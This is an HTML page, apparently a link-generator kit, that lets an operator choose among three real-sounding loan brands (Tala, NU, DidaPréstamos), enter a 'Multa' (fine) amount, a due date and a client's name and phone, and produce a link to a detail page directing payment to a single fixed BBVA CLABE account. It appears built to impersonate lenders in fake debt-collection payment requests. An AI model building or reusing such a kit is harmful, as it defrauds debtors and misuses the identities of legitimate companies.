<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Generador de Ligas</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap');
        body { font-family: 'Inter', sans-serif; background-color: #0b1120; }
        .card-container { width: 100%; max-width: 440px; background: white; border-radius: 3rem; overflow: hidden; shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5); }
        .input-monto { background: transparent; border: none; outline: none; width: 100%; color: white; font-weight: 700; font-size: 2.5rem; }
    </style>
</head>
<body class="flex items-center justify-center min-h-screen p-4">

    <div class="card-container">
        <div id="header-bg" class="bg-[#14b8a6] pt-10 pb-6 px-6">
            <div class="w-20 h-20 bg-white rounded-3xl mx-auto mb-6 flex items-center justify-center overflow-hidden border-4 border-white/20">
                <img id="app-logo" src="https://i.ibb.co/qF6Vvqy/tala-te-presta.png" class="w-full h-full object-cover">
            </div>
            
            <div class="mb-4">
                <select id="product-select" onchange="updateApp()" class="w-full bg-white/20 text-white border-none rounded-2xl px-4 py-3 text-sm font-bold text-center outline-none backdrop-blur-md appearance-none">
                    <option value="tala|#14b8a6|#0d9488">Tala Préstamos</option>
                    <option value="nu|#820ad1|#581c87">Préstamos NU</option>
                    <option value="dida|#2563eb|#1d4ed8">DidaPréstamos</option>
                </select>
            </div>

            <div id="monto-card-bg" class="bg-[#0d9488] rounded-[2rem] p-6 text-white">
                <span class="text-[10px] font-bold opacity-70 uppercase tracking-widest">Monto de Pago</span>
                <div class="flex items-center mt-1">
                    <span class="text-3xl font-bold mr-1">$</span>
                    <input type="number" id="input-monto" oninput="sync()" placeholder="0.00" class="input-monto">
                </div>
            </div>
        </div>

        <div class="p-8 space-y-5 text-slate-800">
            <div class="flex justify-between items-center border-b border-slate-50 pb-2">
                <span class="text-[11px] font-bold text-slate-400 uppercase">Subproducto</span>
                <span class="text-sm font-bold">Multa</span>
            </div>
            <div class="flex justify-between items-center border-b border-slate-50 pb-2">
                <span class="text-[11px] font-bold text-slate-400 uppercase">Importe</span>
                <span id="res-monto" class="text-sm font-bold">$0.00</span>
            </div>
            <div class="flex justify-between items-center border-b border-slate-100 pb-2">
                <span class="text-[11px] font-bold text-slate-400 uppercase">Fecha Vencimiento</span>
                <input type="date" id="f-venc" onchange="dias()" class="text-sm font-bold outline-none text-right">
            </div>
            <div class="flex justify-between items-center border-b border-slate-100 pb-2">
                <span class="text-[11px] font-bold text-slate-400 uppercase">Días Vencimiento</span>
                <span id="res-dias" class="text-sm font-bold">0</span>
            </div>

            <div class="bg-slate-50 rounded-[2rem] p-5 text-center border border-slate-100">
                <span class="text-[9px] font-bold text-slate-400 uppercase block mb-1">Método y CLABE</span>
                <span class="text-sm font-bold text-blue-600">BBVA - 703010052250010635</span>
            </div>

            <div class="space-y-4 pt-2">
                <div class="border-b border-slate-200 flex justify-between items-end pb-1">
                    <label class="text-[11px] font-bold text-slate-400 uppercase">Nombre del cliente</label>
                    <input type="text" id="cliente-nombre" placeholder="Nombre" class="text-right text-sm font-bold outline-none w-1/2">
                </div>
                <div class="border-b border-slate-200 flex justify-between items-end pb-1">
                    <label class="text-[11px] font-bold text-slate-400 uppercase">Teléfono</label>
                    <input type="text" id="cliente-tel" placeholder="Teléfono" class="text-right text-sm font-bold outline-none w-1/2">
                </div>
            </div>

            <button onclick="confirmar()" id="btn-main" class="w-full bg-[#14b8a6] text-white font-bold py-5 rounded-3xl shadow-lg uppercase text-xs tracking-widest mt-2 active:scale-95 transition-all">
                GENERAR LINK
            </button>
        </div>
    </div>

    <script>
        function sync() {
            let v = document.getElementById('input-monto').value || "0";
            document.getElementById('res-monto').innerText = "$" + parseFloat(v).toFixed(2);
        }

        function dias() {
            let f = document.getElementById('f-venc').value;
            if(!f) return;
            let hoy = new Date(); hoy.setHours(0,0,0,0);
            let venc = new Date(f + 'T00:00:00');
            let diff = Math.ceil((venc - hoy) / (1000 * 60 * 60 * 24));
            document.getElementById('res-dias').innerText = diff;
        }

        function updateApp() {
            const [id, c1, c2] = document.getElementById('product-select').value.split('|');
            document.getElementById('header-bg').style.backgroundColor = c1;
            document.getElementById('monto-card-bg').style.backgroundColor = c2;
            document.getElementById('btn-main').style.backgroundColor = c1;
        }

        function confirmar() {
            const monto = document.getElementById('input-monto').value || "0.00";
            const nombre = document.getElementById('cliente-nombre').value || "";
            const tel = document.getElementById('cliente-tel').value || "";
            const fecha = document.getElementById('f-venc').value || "";
            const sel = document.getElementById('product-select');
            const producto = sel.options[sel.selectedIndex].text;

            // Esta línea es la que crea el link hacia la otra página
            window.location.href = `detalle.html?monto=${monto}&nombre=${nombre}&tel=${tel}&fecha=${fecha}&prod=${producto}`;
        }

        // Fecha por defecto hoy
        document.getElementById('f-venc').value = new Date().toISOString().split('T')[0];
    </script>
</body>
</html>
